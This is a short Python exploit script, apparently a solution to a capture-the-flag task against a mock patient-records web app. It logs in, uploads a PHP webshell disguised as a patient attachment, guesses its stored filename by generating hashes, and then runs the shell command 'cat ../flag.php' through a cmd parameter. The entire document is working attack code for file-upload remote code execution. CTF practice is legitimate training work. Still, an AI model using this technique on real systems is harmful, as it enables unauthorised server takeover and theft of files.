import requests
import subprocess
import bs4
import sys

url = 'https://esick.student2020tasks.ctf.su/'

s = requests.Session()
s.post(url + 'login.php', data={'username': 'leo', 'password': 'leo'})


# (filename, name, content-type)
patient_data = {
    'name': (None, 'a'),
    'date_from': (None, '2020-11-16'),
    'date_to': (None, '2020-11-17'),
    'reason': (None, 'b'),
    'attachment': ('rev.php', open('rev.php', 'rb'), 'text/php')
}


r = s.post(url + 'add.php', files=patient_data)
#print(requests.Request('POST', url + 'add.php', files=patient_data).prepare().body.decode('utf8'))

r = s.get(url + 'patients.php')

soup = bs4.BeautifulSoup(r.text, "lxml")

attachment_id = soup.find("input", {"type": "hidden", "name": "id"})["value"]
print("[i] Attachment ID: {}".format(attachment_id))

hashes = subprocess.check_output(["php", "gen_hashes.php", attachment_id]).decode("utf-8").split("\n")
for h in hashes[1:]:
    r = requests.get(url + 'uploads/' + h + '.php')
    if r.status_code == 200:
        r = requests.get(url + 'uploads/' + h + '.php', params={'cmd': 'cat ../flag.php'})
        print(r.text)
        sys.exit(0)